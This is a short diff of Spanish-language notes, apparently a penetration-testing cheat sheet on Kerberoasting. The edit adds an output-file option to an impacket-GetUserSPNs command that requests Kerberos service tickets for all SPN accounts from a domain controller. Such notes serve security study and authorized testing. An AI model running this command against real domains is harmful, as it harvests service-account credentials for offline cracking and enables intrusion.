@@ -8,7 +8,7 @@ Listar los usuarios con SPN
 
 Pedir tickets para todos los usuarios:
 
-    sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user>:'pass' -request
+    sudo impacket-GetUserSPNs -dc-ip <ip_dc> <dominio>/<user>:'pass' -request -outputfile <file_de_guardado>
 
 Pedir tickets para un usuario puntual:
 
